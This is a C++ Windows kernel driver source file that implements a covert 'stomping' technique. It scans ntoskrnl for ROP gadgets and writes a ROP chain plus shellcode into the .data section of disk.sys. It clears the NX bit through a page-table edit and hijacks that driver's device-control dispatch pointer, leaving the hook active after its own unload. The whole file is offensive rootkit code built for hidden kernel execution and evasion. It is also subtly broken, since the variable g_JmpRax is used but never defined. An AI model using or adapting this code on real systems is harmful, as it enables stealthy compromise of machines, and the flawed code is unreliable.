#include "Utils.h"
#include "Payload.h"

// --- Configuration ---
const char* TARGET_CANDIDATES[] = {
    "nvlddmkm.sys", "rt640x64.sys", "disk.sys", "storport.sys"
};

// --- Main Stomping Logic ---
extern "C" NTSTATUS DriverEntry(PDRIVER_OBJECT DriverObject, PUNICODE_STRING RegistryPath) {
    UNREFERENCED_PARAMETER(DriverObject);
    UNREFERENCED_PARAMETER(RegistryPath);

    DbgPrint("[*] Stomper Loaded. Initializing ROP Scanner...\n");

    // 1. Locate ntoskrnl.exe and its .text section for scanning
    uint32_t ntosSize = 0;
    uint64_t ntosBase = GetKernelModule("ntoskrnl.exe", &ntosSize);

    uint32_t textSectionSize = 0;
    // We scan .text for gadgets to ensure they are in executable memory
    uint64_t textSectionAddr = GetSectionBase(ntosBase, ".text", &textSectionSize);

    if (!textSectionAddr) {
        DbgPrint("[-] Failed to find ntoskrnl .text section.\n");
        return STATUS_UNSUCCESSFUL;
    }

    // --- Robust Gadget Discovery Block ---
    // 1. POP RCX
    uint64_t g_PopRcx = FindPattern(textSectionAddr, textSectionSize, "\x59\xC3", "xx");

    // 2. POP RAX
    uint64_t g_PopRax = FindPattern(textSectionAddr, textSectionSize, "\x58\xC3", "xx");

    // 3. AND [RCX], RAX (Dynamic Fallback)
    uint64_t g_AndRcxRax = FindPattern(textSectionAddr, textSectionSize, "\x48\x21\x01\xC3", "xxxx");
    if (!g_AndRcxRax) {
        DbgPrint("[!] Primary AndRcxRax failed. Trying 32-bit operand variant...\n");
        g_AndRcxRax = FindPattern(textSectionAddr, textSectionSize, "\x21\x01\xC3", "xxx");
    }

    // 4. INVLPG [RCX] (Dynamic Fallback)
    uint64_t g_Invlpg = FindPattern(textSectionAddr, textSectionSize, "\x0F\x01\x39\xC3", "xxxx");
    if (!g_Invlpg) {
        DbgPrint("[!] Primary Invlpg failed. Trying non-ret variant...\n");
        g_Invlpg = FindPattern(textSectionAddr, textSectionSize, "\x0F\x01\x39", "xxx");
    }


    if (!g_PopRcx || !g_PopRax || !g_AndRcxRax || !g_JmpRax) {
        DbgPrint("[-] Failed to find necessary ROP gadgets.\n");
        return STATUS_UNSUCCESSFUL;
    }
    DbgPrint("[+] Gadgets Found. Building ROP Chain.\n");

    // 3. Find Target Driver (.data stomp)
    uint64_t targetBase = 0;
    uint64_t dataSectionAddr = 0;
    uint32_t dataSize = 0;
    PDRIVER_OBJECT targetDriverObj = NULL;

    for (const char* name : TARGET_CANDIDATES) {
        targetBase = GetKernelModule(name, NULL);
        if (targetBase) {
            uint64_t section = FindDataSection(targetBase, &dataSize);
            if (section && dataSize > 0x2000) {
                dataSectionAddr = section;

                UNICODE_STRING driverName;
                // Example resolution for disk.sys
                if (strstr(name, "disk")) {
                    RtlInitUnicodeString(&driverName, L"\\Driver\\Disk");
                }
                else {
                    continue;
                }

                ObReferenceObjectByName(&driverName, OBJ_CASE_INSENSITIVE, NULL, 0, *IoDriverObjectType, KernelMode, NULL, (PVOID*)&targetDriverObj);
                break;
            }
        }
    }

    if (!dataSectionAddr || !targetDriverObj) {
        DbgPrint("[-] Target not found or DriverObject unresolved.\n");
        return STATUS_UNSUCCESSFUL;
    }

    // 4. Construct the Payload Layout
    // MEMORY LAYOUT: [ROP_CHAIN] + [SHELLCODE_CTX] + [CovertEntry Code]
    uint64_t ropSize = sizeof(ROP_CHAIN);
    uint64_t ctxSize = sizeof(SHELLCODE_CTX);
    uint64_t codeSize = (uint64_t)CovertEntryEnd - (uint64_t)CovertEntry;
    uint64_t totalSize = ropSize + ctxSize + codeSize;

    uint8_t* targetMem = (uint8_t*)dataSectionAddr;

    // Use MDL to map the .data section as writable for the stomp
    PMDL mdl = IoAllocateMdl(targetMem, (ULONG)totalSize, FALSE, FALSE, NULL);
    MmBuildMdlForNonPagedPool(mdl);
    uint8_t* mapped = (uint8_t*)MmMapLockedPagesSpecifyCache(mdl, KernelMode, MmCached, NULL, FALSE, NormalPagePriority);

    if (!mapped) return STATUS_UNSUCCESSFUL;

    // --- A. Build ROP Chain ---
    ROP_CHAIN rop = { 0 };
    rop.PopRcx = g_PopRcx;
    rop.PteAddress = GetPteAddress(dataSectionAddr);
    rop.PopRax = g_PopRax;
    rop.PteMask = 0x7FFFFFFFFFFFFFFF; // Clear bit 63 (NX bit)
    rop.AndRcxRax = g_AndRcxRax;
    rop.Invlpg = g_Invlpg;
    rop.PopRax2 = g_PopRax;
    rop.PayloadAddr = dataSectionAddr + ropSize + ctxSize;
    rop.JmpRax = g_JmpRax;

    memcpy(mapped, &rop, ropSize);

    // --- B. Build Context ---
    // ctx is declared here to avoid "undeclared identifier" errors
    SHELLCODE_CTX ctx = { 0 };
    ctx.PteAddress = rop.PteAddress;
    ctx.OriginalDispatch = (uint64_t)targetDriverObj->MajorFunction[IRP_MJ_DEVICE_CONTROL];


    // Copy populated context into stomped memory
    memcpy(mapped + ropSize, &ctx, ctxSize);

    // --- C. Copy Shellcode ---
    memcpy(mapped + ropSize + ctxSize, (void*)CovertEntry, codeSize);

    MmUnmapLockedPages(mapped, mdl);
    IoFreeMdl(mdl);

    // 5. Install the Hook (Point to ROP Chain Start)
    // We swap the original dispatch pointer with the address of our ROP chain
    InterlockedExchangePointer((PVOID*)&targetDriverObj->MajorFunction[IRP_MJ_DEVICE_CONTROL], (PVOID)dataSectionAddr);

    DbgPrint("[+] ROP Stomp Complete.\n");
    DbgPrint("[+] Dispatch -> ROP Chain (0x%llX) -> NX Flip -> Payload (0x%llX)\n", dataSectionAddr, rop.PayloadAddr);

    ObDereferenceObject(targetDriverObj);

    // Return failure to unload the stomper driver while leaving the hook active
    return STATUS_UNSUCCESSFUL;
}